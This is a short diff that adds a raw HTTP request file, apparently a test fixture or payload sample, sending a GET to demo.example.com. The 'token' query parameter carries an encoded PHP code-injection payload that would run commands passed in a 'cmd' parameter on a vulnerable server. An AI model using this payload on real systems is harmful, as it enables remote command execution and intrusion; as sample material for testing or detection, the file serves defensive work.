@@ -1,0 +1,4 @@
+GET /a?token=c%3Dexec(@$_REQUEST[\u0027cmd\u0027]) HTTP/1.1
+Host: demo.example.com
+Connection: close
+
